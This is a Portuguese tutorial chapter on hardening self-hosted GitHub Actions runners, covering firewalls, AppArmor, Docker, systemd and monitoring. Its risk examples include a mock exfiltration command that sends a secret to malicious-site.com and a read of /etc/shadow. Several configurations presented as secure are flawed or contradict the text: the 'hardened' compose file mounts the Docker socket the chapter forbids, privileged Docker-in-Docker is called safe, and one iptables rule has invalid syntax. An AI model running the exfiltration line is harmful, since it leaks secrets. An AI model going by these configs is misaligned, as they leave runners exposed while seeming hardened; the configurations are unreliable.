---
layout: default
title: "12-harden-runners"
---

# Capitulo 12 -- Harden Runners

> *"O runner e a fronteira entre seu codigo e o mundo."*

---

## Objetivos de Aprendizado

1. Entender a arquitetura de runners GitHub-hosted
2. Configurar runners self-hosted seguros
3. Implementar Docker-in-Docker com seguranca
4. Configurar runner groups e labels
5. Implementar monitoramento e logging
6. Configurar segmentacao de rede
7. Gerenciar permissoes de filesystem
8. Implementar ephemeral runners
9. Configurar user namespaces
10. Implementar alertas de seguranca
11. Configurar auto-scaling de runners
12. Implementar runner hardening com AppArmor
13. Configurar network policies
14. Gerenciar secrets em runners
15. Implementar audit logging

---

## 12.1 GitHub-Hosted Runners Architecture

### Como Funcionam os Runners GitHub-Hosted

GitHub-hosted runners sao maquinas virtuais efemeras que executam jobs dos workflows. Cada job recebe uma nova VM, o que fornece isolamento basico entre execucoes.

```yaml
# Arquitetura basica:
# 1. Workflow trigger
# 2. GitHub aloca uma VM
# 3. VM e provisionada com tools pre-instalados
# 4. Job executa na VM
# 5. VM e destruida apos conclusao

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Executando em VM efemera"
      # VM e destruida apos este job
```

### Tipos de Runners GitHub-Hosted

| Runner | CPU | RAM | Disco | Preco |
|--------|-----|-----|-------|-------|
| ubuntu-latest | 2 | 7 GB | 14 GB | Gratuito (limites) |
| windows-latest | 2 | 7 GB | 14 GB | Gratuito (limites) |
| macos-latest | 3 | 14 GB | 14 GB | 10x mais caro |
| ubuntu-22.04 | 2 | 7 GB | 14 GB | Gratuito (limites) |
| ubuntu-20.04 | 2 | 7 GB | 14 GB | Gratuito (limites) |
| windows-2022 | 2 | 7 GB | 14 GB | Gratuito (limites) |
| macos-13 | 3 | 14 GB | 14 GB | 10x mais caro |

### Tools Pre-Instalados

```yaml
# Ubuntu (ubuntu-latest)
# - Node.js, Python, Go, Java, .NET
# - Docker, docker-compose
# - git, curl, wget
# - AWS CLI, Azure CLI, gcloud

# Windows (windows-latest)
# - Visual Studio Build Tools
# - Node.js, Python
# - Docker Desktop

# macOS (macos-latest)
# - Xcode
# - Homebrew
# - Node.js, Python
```

### Variaveis de Ambiente do Runner

```yaml
steps:
  - name: Mostrar variaveis do runner
    run: |
      echo "Runner OS: ${{ runner.os }}"
      echo "Runner Name: ${{ runner.name }}"
      echo "Runner Architecture: ${{ runner.arch }}"
      echo "Runner Temp: ${{ runner.temp }}"
      echo "Runner Tool Cache: ${{ runner.tool_cache }}"
```

### Limitacoes dos GitHub-Hosted Runners

```yaml
# Limitacoes:
# 1. 6 horas de execucao maxima
# 2. 20 GB de armazenamento
# 3. 2 CPU cores
# 4. 7 GB de RAM
# 5. Acesso limitado a rede
# 6. Sem persistencia de estado

# Para jobs longos, use self-hosted runners
jobs:
  long-job:
    runs-on: self-hosted
    steps:
      - run: echo "Jobs longos em self-hosted"
```

### GitHub-Hosted Runners vs Self-Hosted

| Caracteristica | GitHub-Hosted | Self-Hosted |
|----------------|---------------|-------------|
| Setup | Automatico | Manual |
| Isolamento | VM por job | Configuravel |
| Custo | Por minuto | Infraestrutura propria |
| Personalizacao | Limitada | Total |
| Manutencao | GitHub | Equipe |
| Escalabilidade | Automatica | Configuravel |
| Seguranca | Padrao | Customizavel |
| Performance | Padrao | Otimizavel |

### Selecao de Runner

```yaml
# Selecionar runner por SO
jobs:
  linux:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Executando no Linux"

  windows:
    runs-on: windows-latest
    steps:
      - run: echo "Executando no Windows"

  macos:
    runs-on: macos-latest
    steps:
      - run: echo "Executando no macOS"

# Selecionar runner por label
jobs:
  self-hosted:
    runs-on: [self-hosted, linux, gpu]
    steps:
      - run: echo "Executando em self-hosted com GPU"
```

---

## 12.2 Ephemeral Runners

### O Que sao Ephemeral Runners

Ephemeral runners sao runners que sao criados para cada job e destruidos apos conclusao.

### Configuracao de Ephemeral Runners

```yaml
# Configuracao do runner
# config.sh --url https://github.com/myorg --token XXX --ephemeral

# Ou via Docker
docker run -e GITHUB_TOKEN=XXX -e RUNNER_NAME=my-runner \
  my-runner-image:latest
```

### Ephemeral Runners com Auto-Scaling

```yaml
name: Auto-Scaling Runners

on:
  workflow_dispatch:
    inputs:
      runners_needed:
        description: 'Numero de runners'
        required: true
        type: number

jobs:
  spawn-runners:
    runs-on: ubuntu-latest
    steps:
      - name: Criar runners efemeros
        run: |
          for i in $(seq 1 ${{ inputs.runners_needed }}); do
            echo "Criando runner $i"
          done
```

### Vantagens dos Ephemeral Runners

| Aspecto | Ephemeral | Persistent |
|---------|-----------|------------|
| Isolamento | Total | Parcial |
| Seguranca | Alta | Media |
| Performance | Media | Alta |
| Custo | Maior | Menor |
| Complexidade | Media | Baixa |
| Limpeza | Automatica | Manual |
| Estado | Nenhum | Persistente |

### Configuracao Docker para Ephemeral

```yaml
# Dockerfile para ephemeral runner
FROM ubuntu:22.04

# Instalar dependencias
RUN apt-get update && apt-get install -y \
    curl \
    git \
    jq \
    build-essential

# Criar usuario runner
RUN useradd -m -s /bin/bash runner

# Instalar GitHub Actions Runner
RUN curl -sL https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz | \
    tar xz -C /home/runner

# Configurar runner
USER runner
WORKDIR /home/runner

# Script de entrada
COPY entrypoint.sh /home/runner/entrypoint.sh
RUN chmod +x /home/runner/entrypoint.sh

ENTRYPOINT ["/home/runner/entrypoint.sh"]
```

### Script de Entrada para Ephemeral

```bash
#!/bin/bash
# entrypoint.sh

set -e

# Registrar runner
./config.sh \
  --url https://github.com/${GITHUB_ORG} \
  --token ${RUNNER_TOKEN} \
  --name ${RUNNER_NAME:-$(hostname)} \
  --labels ${RUNNER_LABELS:-self-hosted,linux} \
  --work ${RUNNER_WORK_DIR:-_work} \
  --ephemeral \
  --replace

# Executar runner
./run.sh

# Limpeza apos execucao
echo "Limpando runner..."
./config.sh remove --token ${RUNNER_TOKEN}
```

### Ephemeral com Kubernetes

```yaml
# Configuracao para ephemeral runners no Kubernetes
apiVersion: apps/v1
kind: Deployment
metadata:
  name: github-runner
spec:
  replicas: 3
  selector:
    matchLabels:
      app: github-runner
  template:
    metadata:
      labels:
        app: github-runner
    spec:
      containers:
      - name: runner
        image: myorg/github-runner:latest
        env:
        - name: GITHUB_ORG
          value: "myorg"
        - name: RUNNER_TOKEN
          valueFrom:
            secretKeyRef:
              name: runner-token
              key: token
        - name: RUNNER_LABELS
          value: "self-hosted,linux,kubernetes"
        resources:
          requests:
            cpu: "1"
            memory: "2Gi"
          limits:
            cpu: "2"
            memory: "4Gi"
      serviceAccountName: github-runner
```

---

## 12.3 Self-Hosted Risks

### Riscos de Self-Hosted Runners

| Risco | Descricao | Mitigacao |
|-------|-----------|-----------|
| Persistent state | Dados entre jobs podem vazar | Ephemeral containers |
| Network access | Acesso irrestrito a rede | Firewalls, VPN |
| File system | Acesso a arquivos do host | Containers, isolation |
| Privilege escalation | Root no host | User namespaces |
| Supply chain | Dependencias maliciosas | Pin versions, scan |
| Credential exposure | Secrets persistentes | Rotacao, vault |

### Exemplo de Vulnerabilidade

```yaml
# VULNERABILIDADE: Runner persistente
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: |
          echo "secret" > /tmp/secret.txt
          # Proximo job pode acessar este arquivo

# CORRECAO: Ephemeral runner
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20
    steps:
      - run: |
          echo "secret" > /tmp/secret.txt
          # Container sera destruido apos o job
```

### Riscos de Rede

```yaml
# RISCO: Acesso irrestrito a rede
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: |
          curl https://malicious-site.com/exfil?data=$SECRET

# MITIGACAO: Network segmentation
jobs:
  build:
    runs-on: [self-hosted, linux, internal]
    steps:
      - run: |
          curl https://internal-api.company.com/data
```

### Riscos de Filesystem

```yaml
# RISCO: Acesso a filesystem do host
jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: |
          # Pode acessar arquivos sensiveis
          cat /etc/shadow
          ls -la /root/

# MITIGACAO: Container com filesystem read-only
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20
      options: --read-only --tmpfs /tmp
    steps:
      - run: |
          # Nao pode acessar filesystem do host
          echo "Executando em container isolado"
```

### Mitigacao de Riscos

```yaml
# 1. Usar ephemeral containers
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20
    steps:
      - run: echo "Container destruido apos job"

# 2. Configurar network policies
# 3. Usar user namespaces
# 4. Implementar audit logging
# 5. Rotacionar secrets regularmente
# 6. Monitorar atividades
```

---

## 12.4 Runner Groups and Labels

### Runner Groups

Runner groups permitem organizar runners e restringir acesso.

```yaml
# Configurar runner groups na GitHub UI:
# Settings > Actions > Runner groups

# Groups recomendados:
# - build: Para builds gerais
# - deploy: Para deploy
# - security: Para jobs sensiveis
# - gpu: Para jobs com GPU
```

### Uso de Runner Groups

```yaml
jobs:
  build:
    runs-on: [self-hosted, linux, build]
    steps:
      - run: echo "Executando em runner de build"

  deploy:
    runs-on: [self-hosted, linux, deploy]
    steps:
      - run: echo "Executando em runner de deploy"

  security-scan:
    runs-on: [self-hosted, linux, security]
    steps:
      - run: echo "Executando em runner de seguranca"
```

### Labels

Labels permitem selecionar runners especificos.

```yaml
# Labels disponiveis por padrao:
# - self-hosted
# - linux
# - windows
# - macos

# Labels customizadas:
# - gpu
# - high-memory
# - internal-network

jobs:
  gpu-job:
    runs-on: [self-hosted, linux, gpu]
    steps:
      - run: echo "Executando em runner com GPU"

  high-memory:
    runs-on: [self-hosted, linux, high-memory]
    steps:
      - run: echo "Executando em runner com muita memoria"
```

### Configuracao de Labels

```bash
# Configurar label customizada
./config.sh --labels "gpu,high-memory,internal"

# Listar labels
./config.sh --list

# Verificar labels do runner
curl -s -H "Authorization: token $TOKEN" \
  https://api.github.com/repos/myorg/myrepo/actions/runners | \
  jq '.runners[].labels[].name'
```

### Gerenciamento de Runner Groups

```yaml
# Configurar via API
curl -X POST \
  -H "Authorization: token $GITHUB_TOKEN" \
  https://api.github.com/orgs/{org}/actions/runner-groups \
  -d '{
    "name": "build-runners",
    "visibility": "selected",
    "selected_repositories": [123456, 789012],
    "allows_public_repositories": false
  }'
```

### Estrategia de Labels

| Label | Uso | Exemplo |
|-------|-----|---------|
| self-hosted | Runner self-hosted | Qualquer job |
| linux | SO Linux | Builds Linux |
| windows | SO Windows | Builds Windows |
| macos | SO macOS | Builds macOS |
| gpu | Com GPU | Machine learning |
| high-memory | Alta memoria | Builds pesados |
| internal | Rede interna | Deploy interno |
| build | Para builds | CI/CD |
| deploy | Para deploys | Producao |
| security | Para seguranca | Scans sensiveis |

---

## 12.5 Hardening Self-Hosted Runners

### Configuracao de Seguranca

```yaml
# 1. Executar como usuario nao-root
# config.sh --url https://github.com --user runner --password XXX

# 2. Configurar permissoes de filesystem
chmod 700 /home/runner
chmod 600 /home/runner/.runner
chmod 600 /home/runner/.credentials

# 3. Configurar firewall
# Permitir apenas HTTPS para GitHub
# Bloquear todo outro trafego
```

### Exemplo de Runner Hardened

```yaml
name: Hardened Runner

on: [push]

jobs:
  secure-build:
    runs-on: [self-hosted, linux, hardened]
    timeout-minutes: 30
    steps:
      - name: Verificar integridade do runner
        run: |
          echo "Runner OS: ${{ runner.os }}"
          echo "Runner Name: ${{ runner.name }}"
          echo "User: $(whoami)"
          echo "Home: $HOME"
          
          if [ "$(id -u)" = "0" ]; then
            echo "AVISO: Rodando como root"
            exit 1
          fi

      - uses: actions/checkout@v4

      - name: Build
        run: |
          echo "Executando build..."
          npm ci
          npm run build

      - name: Cleanup
        if: always()
        run: |
          rm -rf node_modules
          rm -rf dist
          docker system prune -f
```

### Configuracao de Firewall

```bash
#!/bin/bash
# setup-firewall.sh

# Permitir apenas HTTPS para GitHub
iptables -A OUTPUT -p tcp --dport 443 -d api.github.com -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -d github.com -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -d objects.githubusercontent.com -j ACCEPT

# Bloquear todo outro trafego
iptables -A OUTPUT -p tcp --dport 80 -j DROP
iptables -A OUTPUT -p tcp --dport 443 -d ! github.com -j DROP
iptables -A OUTPUT -p udp --dport 53 -j DROP
```

### User Namespaces

```bash
# Configurar user namespaces para isolamento
# /etc/sysctl.conf
kernel.unprivileged_userns_clone=1
kernel.apparmor_restrict_unprivileged_userns=0

# Configurar AppArmor para o runner
# /etc/apparmor.d/github-runner
/usr/local/bin/runner {
  deny /home/** w,
  deny /tmp/** w,
  deny /var/** w,
  owner /home/runner/** rw,
}
```

### AppArmor Profile

```bash
# /etc/apparmor.d/usr.local.bin.runner
#include <tunables/global>

/usr/local/bin/runner {
  #include <abstractions/base>
  #include <abstractions/nameservice>

  # Negar acesso a diretorios sensiveis
  deny /etc/shadow r,
  deny /etc/passwd w,
  deny /root/** rw,
  deny /home/*/.ssh/** rw,
  deny /home/*/.gnupg/** rw,

  # Permitir acesso ao diretorio do runner
  /home/runner/** rw,
  /home/runner/.runner r,
  /home/runner/.credentials r,

  # Permitir acesso a rede
  network inet stream,
  network inet dgram,

  # Permitir execucao de comandos
  /usr/bin/** ix,
  /usr/local/bin/** ix,
}
```

### Configuracao de SELinux

```bash
# Configurar SELinux para o runner
# /etc/selinux/targeted/policy/semanage

# Criar contexto de seguranca
semanage fcontext -a -t user_home_t "/home/runner(/.*)?"
semanage fcontext -a -t user_home_t "/home/runner/.runner(/.*)?"

# Aplicar contexto
restorecon -Rv /home/runner/
```

---

## 12.6 Docker-in-Docker Security

### Riscos do Docker-in-Docker

```yaml
# PERIGOSO: Docker socket compartilhado
jobs:
  build:
    runs-on: self-hosted
    container:
      image: docker:latest
      volumes:
        - /var/run/docker.sock:/var/run/docker.sock  # NUNCA!
```

### Docker-in-Docker Seguro

```yaml
# SEGURO: Docker-in-Docker (dind)
jobs:
  build:
    runs-on: self-hosted
    container:
      image: docker:dind
      options: --privileged

# SEGURO: Rootless Docker
jobs:
  build:
    runs-on: self-hosted
    container:
      image: docker:rootless
```

### Exemplo de Build com Docker

```yaml
name: Docker Build

on: [push]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      
      - name: Build image
        run: |
          docker build -t myapp:${{ github.sha }} .
      
      - name: Test image
        run: |
          docker run --rm myapp:${{ github.sha }} npm test
      
      - name: Push image
        run: |
          echo "$DOCKER_PASSWORD" | docker login -u "$DOCKER_USERNAME" --password-stdin
          docker push myorg/myapp:${{ github.sha }}
      
      - name: Cleanup
        if: always()
        run: |
          docker rmi myapp:${{ github.sha }} || true
          docker system prune -f
```

### Docker Security Best Practices

```yaml
# 1. Usar imagens oficiais
- run: docker pull node:20-alpine

# 2. Pin versions
- run: docker pull node:20.11.0-alpine

# 3. Scan images
- run: docker scout cves myapp:latest

# 4. Usar multi-stage builds
# Dockerfile
FROM node:20 AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:20-alpine
WORKDIR /app
COPY --from=builder /app/dist ./dist
CMD ["node", "dist/index.js"]

# 5. Nao rodar como root
USER node
```

### Docker com Rootless Mode

```yaml
name: Rootless Docker Build

on: [push]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      
      - name: Build with rootless Docker
        run: |
          # Configurar rootless Docker
          dockerd-rootless-setuptool.sh install
          
          # Build image
          docker build -t myapp:${{ github.sha }} .
          
          # Verificar se nao e root
          if [ "$(id -u)" = "0" ]; then
            echo "ERRO: Rodando como root"
            exit 1
          fi
```

### Docker Scout para Seguranca

```yaml
name: Docker Security Scan

on:
  push:
    tags: ['v*']

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Build image
        run: |
          docker build -t myorg/myapp:${{ github.ref_name }} .
      
      - name: Run Docker Scout
        run: |
          docker scout cves myorg/myapp:${{ github.ref_name }} \
            --only-severity critical,high \
            --exit-code 1
```

---

## 12.7 File System Permissions

### Configuracao de Permissoes

```yaml
name: File System Security

on: [push]

jobs:
  secure-build:
    runs-on: [self-hosted, linux, hardened]
    steps:
      - name: Verificar permissoes
        run: |
          echo "=== Permissoes do Runner ==="
          echo "User: $(whoami)"
          echo "Home: $HOME"
          echo "Workdir: $(pwd)"
          
          ls -la $HOME/.runner
          ls -la $HOME/.credentials

      - name: Configurar permissoes seguras
        run: |
          WORKDIR=$(mktemp -d)
          chmod 700 $WORKDIR
          cd $WORKDIR
          echo "Workdir: $WORKDIR"

      - uses: actions/checkout@v4

      - name: Build
        run: |
          npm ci
          npm run build

      - name: Cleanup
        if: always()
        run: |
          rm -rf $WORKDIR
```

### Diretorios Protegidos

```yaml
# Diretorios que devem ter permissoes restritas:
# - /home/runner/.runner (700)
# - /home/runner/.credentials (600)
# - /home/runner/.ssh (700)
# - /home/runner/.gnupg (700)

# Script de verificacao
steps:
  - name: Verificar diretorios criticos
    run: |
      for dir in .runner .credentials .ssh .gnupg; do
        if [ -d "$HOME/$dir" ]; then
          PERMS=$(stat -c %a "$HOME/$dir")
          if [ "$PERMS" != "700" ] && [ "$PERMS" != "600" ]; then
            echo "AVISO: Permissoes incorretas em $dir: $PERMS"
            chmod 700 "$HOME/$dir"
          fi
        fi
      done
```

### Filesystem Read-Only

```yaml
# Configurar filesystem read-only para containers
jobs:
  build:
    runs-on: self-hosted
    container:
      image: node:20
      options: |
        --read-only
        --tmpfs /tmp:rw,noexec,nosuid
        --tmpfs /var/tmp:rw,noexec,nosuid
    steps:
      - run: echo "Executando em filesystem read-only"
```

### Verificacao de Integridade do Filesystem

```yaml
name: Filesystem Integrity

on:
  schedule:
    - cron: '0 6 * * *'  # Diariamente

jobs:
  verify:
    runs-on: [self-hosted, linux, security]
    steps:
      - name: Verificar integridade
        run: |
          echo "=== Verificacao de Integridade ==="
          
          # Verificar permissoes de diretorios criticos
          for dir in /home/runner /etc /var; do
            if [ -d "$dir" ]; then
              echo "Verificando $dir..."
              find "$dir" -type f -perm /o+w -ls
            fi
          done
          
          # Verificar arquivos modificados
          if [ -f "/tmp/filelist.txt" ]; then
            echo "Verificando mudancas..."
            md5sum -c /tmp/filelist.txt
          else
            echo "Criando baseline..."
            find /home/runner -type f -exec md5sum {} \; > /tmp/filelist.txt
          fi
```

---

## 12.8 Network Segmentation

### Configuracao de Rede

```yaml
name: Network Segmented Build

on: [push]

jobs:
  build:
    runs-on: [self-hosted, linux, internal]
    steps:
      - name: Verificar conectividade
        run: |
          echo "=== Teste de Rede ==="
          
          curl -s -o /dev/null -w "%{http_code}" https://api.github.com
          
          curl -s -o /dev/null -w "%{http_code}" https://registry.npmjs.org
          
          curl -s -o /dev/null -w "%{http_code}" https://malicious-site.com || echo "Bloqueado"
```

### Firewall Rules

```bash
#!/bin/bash
# network-config.sh

# Permitir apenas trafego necessario
# GitHub API
iptables -A OUTPUT -d api.github.com -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d github.com -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d objects.githubusercontent.com -p tcp --dport 443 -j ACCEPT

# Package registries
iptables -A OUTPUT -d registry.npmjs.org -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d registry.yarnpkg.com -p tcp --dport 443 -j ACCEPT
iptables -A OUTPUT -d pypi.org -p tcp --dport 443 -j ACCEPT

# DNS
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT

# Bloquear todo o resto
iptables -A OUTPUT -j DROP
```

### VPN para Acesso Interno

```yaml
name: VPN Build

on: [push]

jobs:
  build:
    runs-on: [self-hosted, linux, vpn]
    steps:
      - name: Conectar VPN
        run: |
          sudo openvpn --config /etc/openvpn/client.conf --daemon
          sleep 10
          
          ping -c 3 internal-api.company.com

      - name: Build
        run: |
          curl -s https://internal-api.company.com/config
```

### Network Policies Kubernetes

```yaml
# Network policy para runners no Kubernetes
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: github-runner-network-policy
spec:
  podSelector:
    matchLabels:
      app: github-runner
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
    ports:
    - protocol: TCP
      port: 443
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 5432
    - protocol: TCP
      port: 6379
```

---

## 12.9 Monitoring

### Logging de Atividades

```yaml
name: Runner Monitoring

on: [push]

jobs:
  monitored-build:
    runs-on: [self-hosted, linux, monitored]
    steps:
      - name: Log inicio do job
        run: |
          echo "=== Job Init ===" >> /var/log/github-runner/audit.log
          echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /var/log/github-runner/audit.log
          echo "Runner: ${{ runner.name }}" >> /var/log/github-runner/audit.log
          echo "Job: ${{ github.job }}" >> /var/log/github-runner/audit.log
          echo "User: $(whoami)" >> /var/log/github-runner/audit.log

      - uses: actions/checkout@v4

      - name: Build
        run: |
          echo "Executando build..."
          npm ci
          npm run build

      - name: Log fim do job
        if: always()
        run: |
          echo "=== Job End ===" >> /var/log/github-runner/audit.log
          echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /var/log/github-runner/audit.log
          echo "Status: ${{ job.status }}" >> /var/log/github-runner/audit.log
```

### Alertas de Seguranca

```yaml
name: Security Alerts

on:
  workflow_run:
    workflows: ["*"]
    types: [completed]

jobs:
  check:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'failure'
    steps:
      - name: Enviar alerta
        run: |
          echo "=== ALERTA: Workflow falhou ==="
          echo "Workflow: ${{ github.event.workflow_run.name }}"
          echo "Branch: ${{ github.event.workflow_run.head_branch }}"
          echo "Actor: ${{ github.event.workflow_run.actor.login }}"
```

### Metricas de Performance

```yaml
name: Runner Metrics

on: [push]

jobs:
  build:
    runs-on: [self-hosted, linux, metrics]
    steps:
      - name: Coletar metricas
        run: |
          echo "=== Metricas do Runner ==="
          
          echo "CPU:"
          nproc
          uptime
          
          echo "Memoria:"
          free -h
          
          echo "Disco:"
          df -h
          
          echo "Rede:"
          ip addr show | grep "inet " | awk '{print $2}'

      - uses: actions/checkout@v4

      - name: Build
        run: |
          START=$(date +%s)
          npm ci
          npm run build
          END=$(date +%s)
          DURATION=$((END - START))
          echo "Build duration: ${DURATION}s"
```

### Monitoramento com Prometheus

```yaml
# Configurar exporter para Prometheus
# prometheus.yml
scrape_configs:
  - job_name: 'github-runner'
    static_configs:
      - targets: ['localhost:9100']
    metrics_path: /metrics
```

### Alertas com Grafana

```yaml
# Dashboard de monitoramento de runners
# panels:
#   - title: Runner Status
#     targets:
#       - expr: github_runner_status
#   - title: Job Duration
#     targets:
#       - expr: github_job_duration_seconds
#   - title: Failed Jobs
#     targets:
#       - expr: github_job_failed_total
```

---

## 12.10 Secure Runner Example

```yaml
name: Secure Self-Hosted CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-check:
    runs-on: [self-hosted, linux, security]
    steps:
      - name: Verificar integridade do runner
        run: |
          echo "=== Verificacao de Seguranca ==="
          
          if [ "$(id -u)" = "0" ]; then
            echo "ERRO: Rodando como root"
            exit 1
          fi
          
          if [ ! -r "$HOME/.runner" ]; then
            echo "ERRO: .runner nao legivel"
            exit 1
          fi
          
          if ! curl -s -o /dev/null -w "%{http_code}" https://api.github.com | grep -q "200"; then
            echo "ERRO: Sem acesso ao GitHub"
            exit 1
          fi
          
          echo "Verificacao concluida com sucesso"

  build:
    needs: security-check
    runs-on: [self-hosted, linux, build]
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup
        run: |
          node --version
          npm --version

      - name: Install
        run: npm ci

      - name: Test
        run: npm test

      - name: Build
        run: npm run build

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/

  deploy:
    needs: build
    runs-on: [self-hosted, linux, deploy]
    environment: production
    steps:
      - uses: actions/checkout@v4
      
      - name: Download artifacts
        uses: actions/download-artifact@v4
        with:
          name: build
          path: dist/

      - name: Deploy
        run: |
          echo "Deploying..."

      - name: Cleanup
        if: always()
        run: |
          rm -rf dist/
          docker system prune -f
```

---

## 12.11 Runner Hardening com Systemd

### Configuracao Systemd

```ini
# /etc/systemd/system/github-runner.service
[Unit]
Description=GitHub Actions Runner
After=network.target

[Service]
Type=simple
User=runner
Group=runner
WorkingDirectory=/home/runner
ExecStart=/home/runner/run.sh
Restart=always
RestartSec=10

# Seguranca
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/home/runner/_work
PrivateTmp=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes

[Install]
WantedBy=multi-user.target
```

### Script de Instalacao

```bash
#!/bin/bash
# setup-runner.sh

set -e

echo "=== Configuracao de Runner Hardened ==="

# Criar usuario
useradd -m -s /bin/bash runner

# Instalar runner
su - runner -c "
  curl -sL https://github.com/actions/runner/releases/download/v2.311.0/actions-runner-linux-x64-2.311.0.tar.gz | \
  tar xz
"

# Configurar permissoes
chown -R runner:runner /home/runner
chmod 700 /home/runner
chmod 600 /home/runner/.runner
chmod 600 /home/runner/.credentials

# Configurar systemd
cp github-runner.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable github-runner
systemctl start github-runner

echo "=== Runner configurado ==="
```

---

## 12.12 Runner Hardening com Docker Compose

### Configuracao Docker Compose

```yaml
# docker-compose.yml
version: '3.8'

services:
  runner:
    image: myorg/github-runner:latest
    container_name: github-runner
    restart: unless-stopped
    environment:
      - GITHUB_ORG=myorg
      - RUNNER_TOKEN=${RUNNER_TOKEN}
      - RUNNER_LABELS=self-hosted,linux,docker
    volumes:
      - runner-work:/home/runner/_work
      - /var/run/docker.sock:/var/run/docker.sock
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE
    security_opt:
      - no-new-privileges:true
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid
      - /var/tmp:rw,noexec,nosuid
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 4G
        reservations:
          cpus: '1'
          memory: 2G

volumes:
  runner-work:
```

### Script de Gerenciamento

```bash
#!/bin/bash
# manage-runner.sh

case "$1" in
  start)
    docker-compose up -d
    ;;
  stop)
    docker-compose down
    ;;
  restart)
    docker-compose down
    docker-compose up -d
    ;;
  logs)
    docker-compose logs -f
    ;;
  status)
    docker-compose ps
    ;;
  *)
    echo "Uso: $0 {start|stop|restart|logs|status}"
    ;;
esac
```

---

## 12.13 Exercicios

1. Compare GitHub-hosted vs self-hosted runners em termos de custo e seguranca
2. Configure runner groups para isolar jobs sensiveis
3. Implemente verificacao de integridade do runner
4. Configure Docker-in-Docker seguro
5. Implemente monitoramento de activity logs
6. Configure firewall para runners self-hosted
7. Implemente ephemeral runners com auto-scaling
8. Configure user namespaces para isolamento
9. Implemente metricas de performance para runners
10. Configure alertas de seguranca para runners
11. Configure AppArmor para runners
12. Implemente network segmentation
13. Configure rootless Docker
14. Implemente audit logging completo
15. Configure systemd para gerenciamento de runners

---

## 12.14 Runner para Diferentes Casos de Uso

### Runner para Machine Learning

```yaml
name: ML Training Pipeline

on:
  push:
    branches: [main]

jobs:
  train:
    runs-on: [self-hosted, linux, gpu]
    container:
      image: nvidia/cuda:12.2-devel-ubuntu22.04
      options: --gpus all
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Python
        run: |
          apt-get update && apt-get install -y python3-pip
          pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121
      
      - name: Train model
        run: |
          python3 train.py --epochs 100 --batch-size 32
      
      - name: Upload model
        uses: actions/upload-artifact@v4
        with:
          name: model
          path: models/

  evaluate:
    needs: train
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Download model
        uses: actions/download-artifact@v4
        with:
          name: model
          path: models/
      
      - name: Evaluate
        run: |
          python3 evaluate.py --model models/
```

### Runner para Builds Pesados

```yaml
name: Heavy Build Pipeline

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: [self-hosted, linux, high-memory]
    timeout-minutes: 120
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Setup build environment
        run: |
          echo "Sistema:"
          nproc
          free -h
          df -h
      
      - name: Build large project
        run: |
          make -j$(nproc) all
      
      - name: Run tests
        run: |
          make test
      
      - name: Package
        run: |
          make package
      
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: dist/
          retention-days: 30
```

### Runner para Deploy

```yaml
name: Deploy Pipeline

on:
  push:
    branches: [main]

jobs:
  deploy:
    runs-on: [self-hosted, linux, deploy]
    environment: production
    steps:
      - uses: actions/checkout@v4
      
      - name: Deploy to production
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: |
          ssh -i $DEPLOY_KEY deploy@production-server \
            "cd /opt/app && git pull && npm install && npm run build && pm2 restart all"
      
      - name: Verify deployment
        run: |
          sleep 30
          curl -s -o /dev/null -w "%{http_code}" https://myapp.com
```

### Runner para Seguranca

```yaml
name: Security Scan Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: [self-hosted, linux, security]
    steps:
      - uses: actions/checkout@v4
      
      - name: Run SAST scan
        run: |
          echo "=== SAST Scan ==="
          # Executar ferramenta de analise estatica
      
      - name: Run dependency scan
        run: |
          echo "=== Dependency Scan ==="
          npm audit --audit-level=high
      
      - name: Run secret scan
        run: |
          echo "=== Secret Scan ==="
          # Verificar secrets no codigo
      
      - name: Generate report
        run: |
          echo "=== Security Report ==="
          # Gerar relatorio de seguranca
```

---

## 12.15 Gerenciamento de Runners em Escala

### Auto-Scaling com Actions Runner Controller

